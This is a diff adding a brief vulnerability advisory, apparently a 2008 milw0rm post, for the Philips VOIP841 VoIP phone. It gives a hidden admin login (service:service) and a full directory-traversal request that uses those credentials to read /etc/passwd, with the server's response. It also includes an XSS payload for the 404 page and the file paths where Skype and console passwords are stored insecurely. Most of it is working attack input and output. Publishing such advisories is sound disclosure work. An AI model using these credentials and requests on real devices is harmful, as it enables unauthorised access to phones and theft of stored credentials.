@@ -1,0 +1,41 @@
+.:[ Philips VOIP841 Multiple Vulnerabilities ]:.
+Luca "ikki" Carettoni - luca.carettoni@ikkisoft.com
+
+Systems affected: Philips VOIP841, Firmware Version 1.0.4.50 and 1.0.4.80, Web Server Version 1.5 (simple httpd)
+Systems not affected: n/a
+
+(a) Hidden Administration Account (web management console)
+
+service:service
+
+(b) Directory Listing, Directory Traversal
+
+jungle ikki $ telnet 192.168.1.10 80
+Trying 192.168.1.10...
+Connected to 192.168.1.10.
+Escape character is '^]'.
+GET /../../../../../../../../etc/passwd HTTP/1.0
+Host: 192.168.1.10
+Authorization: Basic c2VydmljZTpzZXJ2aWNl
+
+HTTP/1.0 200 OK
+Content-type: text/plain
+Expires: Sat, 24 May 1980.7:00:00.GMT
+Pragma: no-cache
+Server: simple httpd 1.0
+
+root:x:0:0:root:/root:/bin/bash
+demo:x:5000:100:Demo User:/home/demo:/bin/bash
+nobody:x:65534:65534:Nobody:/htdocs:/bin/bash
+Connection closed by foreign host.
+
+(c) Cross Site Scripting (XSS) inside the 404 standard response page
+
+GET /var/htdocs/<script>alert("XSS");</script> HTTP/1.0
+
+(d) Insecure Storage (Skype credentials,  web management console passwords, ...)
+
+/var/jffs2/data/save.dat
+/tmp/apply.log
+
+# milw0rm.com [2008-02-14]
